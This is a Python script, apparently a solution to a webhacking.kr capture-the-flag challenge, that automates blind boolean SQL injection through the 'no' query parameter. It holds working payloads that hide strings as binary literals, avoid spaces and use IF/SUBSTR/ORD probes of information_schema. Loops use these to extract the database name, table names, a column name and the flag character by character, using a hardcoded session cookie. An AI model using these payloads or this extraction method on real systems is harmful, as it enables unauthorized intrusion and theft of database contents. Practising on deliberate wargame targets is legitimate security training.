import requests
import string
import time

import binascii
def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def string_to_binary(s):
    res = '0b'
    for c in s:
        res += (bin(int(binascii.hexlify(c.encode()),16))[2:]).rjust(8,'0')
    return res
#    return bin(int(binascii.hexlify(s.encode()),16))

# print(string_to_binary('^FLAG{$'))

URL = "https://webhacking.kr/challenge/web-10/index.php"
SESSION_ID = "215o6b6hh84u927ghaev4nucdo"
cookies = {'PHPSESSID':SESSION_ID}
params ={'no':''}

length_database = 7

# # find length of database name
for length_database in range(30):
    payload = f"IF(length(database())regexp({length_database}),1,0)"
    params['no'] = payload
    # print(str(i) + ' ' + payload)
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '<td>1</td>' in response.text:
        break
print("length of database is: {0}".format(length_database))

# # find database name
database = "chall13"
i = 1
while len(database) < length_database:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary = string_to_binary(('^'+database+c+'$').replace("_", r"\_"))
        payload = f"IF(substr(database(),1,{i})regexp(0b{binary}),1,0)"
        
        # print(f"{c}: {payload}")
        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '<td>1</td>' in response.text:
            i += 1
            database += c
            print("database: " + database.ljust(length_database, '*'))
            # print(database)
            break



# now, lets find how much tables there are on our db
count = 2
for count in range(10):
    binary_database = string_to_binary((database).replace("_", r"_"))
    payload = f"IF((SELECT(COUNT(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL)))FROM(information_schema.tables))IN({count}),1,0)"
    # print('{0} : {1}'.format(i,payload))
    params['no'] = payload
    response = requests.get(URL,params=params, cookies=cookies)
    
    if '<td>1</td>' in response.text:
        break
print("number of tables: {}".format(count))


# find length of minimum table
min_length = 13     
for min_length in range(50):
    binary_database = string_to_binary((database).replace("_", r"\_"))
    payload = f"IF((SELECT(LENGTH(MIN(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL))))FROM(information_schema.tables))IN({min_length}),1,0)"

    params['no'] = payload
    # print(str(i) + ' ' + payload)
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '<td>1</td>' in response.text:
        break
print("length of min table is: {0}".format(min_length))


# find length of maximum table
max_length = 4
for max_length in range(50):
    binary_database = string_to_binary((database).replace("_", r"_"))
    payload = f"IF((SELECT(LENGTH(MAX(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL))))FROM(information_schema.tables))IN({max_length}),1,0)"

    params['no'] = payload
    # print('{0} : {1}'.format(i,payload))
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '<td>1</td>' in response.text:
        break
print("length of max table is: {0}".format(max_length))

# now, need to find the minimum table name
table_min = 'flag_ab733768'
inx = 1
while len(table_min) < min_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary_table = string_to_binary((table_min+c).replace("_", r"_"))
        binary_database = string_to_binary((database).replace("_", r"_"))
        payload = f"IF(SUBSTR((SELECT(MIN(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL)))FROM(information_schema.tables)),1,{inx})IN({binary_table}),1,0)"
        # print('{0} : {1}'.format(c,payload))

        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '<td>1</td>' in response.text:
            inx += 1
            table_min += c
            print("min table: " + table_min.ljust(min_length, '*'))
            break
    else:
        print("failed to find min table")
        break


# now, need to find the maximum table name
table_max = 'list'
inx = 1
while len(table_max) < max_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary_table = string_to_binary((table_max+c).replace("_", r"_"))
        binary_database = string_to_binary((database).replace("_", r"_"))
        payload = f"IF(SUBSTR((SELECT(MAX(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL)))FROM(information_schema.tables)),1,{inx})IN({binary_table}),1,0)"
        # print('{0} : {1}'.format(c,payload))

        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '<td>1</td>' in response.text:
            inx += 1
            table_max += c
            print("max table: " + table_max.ljust(max_length, '*'))
            break
    else:
        print("failed to find max table")
        break


# find number of columns in table min
table_name = table_min
count = 1
for count in range(10):
    binary_table = string_to_binary((table_name).replace("_", r"_"))

    payload = f"IF((SELECT(COUNT(IF((SELECT(table_name)IN({binary_table})),column_name,NULL)))FROM(information_schema.columns))IN({count}),1,0)"
    # print('{0} : {1}'.format(i,payload))
    params['no'] = payload
    response = requests.get(URL,params=params, cookies=cookies)
    
    if '<td>1</td>' in response.text:
        break

print("number of columns in table {1}: {0}".format(count, table_name))


# find length of column
column_length = 13
for column_length in range(50):
    binary_table = string_to_binary((table_name).replace("_", r"_"))

    payload = f"IF((SELECT(LENGTH(MIN(IF((SELECT(table_name)IN({binary_table})),column_name,NULL))))FROM(information_schema.columns))IN({column_length}),1,0)"

    params['no'] = payload
    # print('{0} : {1}'.format(i,payload))
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '<td>1</td>' in response.text:
        break
print("length of column is: {0}".format(column_length))


# now, find the columns name
table_column = 'flag_3a55b31d'
inx = 1
while len(table_column) < column_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary_table = string_to_binary((table_name).replace("_", r"_"))
        binary_column = string_to_binary((table_column+c).replace("_", r"_"))

        payload = f"IF(SUBSTR((SELECT(MIN(IF((SELECT(table_name)IN({binary_table})),column_name,NULL)))FROM(information_schema.columns)),1,{inx})IN({binary_column}),1,0)"
        # print('{0} : {1}'.format(c,payload))


        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '<td>1</td>' in response.text:
            inx += 1
            table_column += c
            print("column name: " + table_column.ljust(min_length, '*'))
            break
    else:
        print("failed to find column name")
        break

# find length of the flag
flag_length = 27
for flag_length in range(50):
    # binary_database = string_to_binary((database).replace("_", r"_"))  
    # binary_table = string_to_binary((table_name).replace("_", r"_"))
    binary_table = string_to_binary((database+"."+table_name).replace("_", r"_"))
    binary_column = string_to_binary((table_column).replace("_", r"_"))

    payload = f"IF((SELECT(LENGTH(MAX({table_column})))FROM({database}.{table_name}))IN({flag_length}),1,0)"

    params['no'] = payload
    # print('{0} : {1}'.format(i,payload))
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '<td>1</td>' in response.text:
        break
print("length of flag is: {0}".format(flag_length))


# and after all, find the secret!
flag = ''
inx = 1
while len(flag) < flag_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        # binary_flag = string_to_binary((flag+c).replace("_", r"_"))
        binary_char = string_to_binary((c).replace("_", r"_"))
        # binary_database = string_to_binary((database).replace("_", r"_"))  
        # binary_table = string_to_binary((table_name).replace("_", r"_"))
        binary_table = string_to_binary((database+"."+table_name).replace("_", r"_"))
        binary_column = string_to_binary((table_column).replace("_", r"_"))

        # payload = f"IF(SUBSTR((SELECT(MAX({binary_column}))FROM({binary_table})),1,{inx})IN({binary_flag}),1,0)"
        payload = f"IF(ORD(SUBSTR((SELECT(MAX({table_column}))FROM({database}.{table_name})),{inx},1))IN(ORD({binary_char})),1,0)"
        # print('{0} : {1}'.format(c,payload))

        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '<td>1</td>' in response.text:
            inx += 1
            flag += c
            print("flag: " + flag.ljust(flag_length, '*'))
            break
    else:
        print("finished! the flag is: {0}".format(flag))
        break
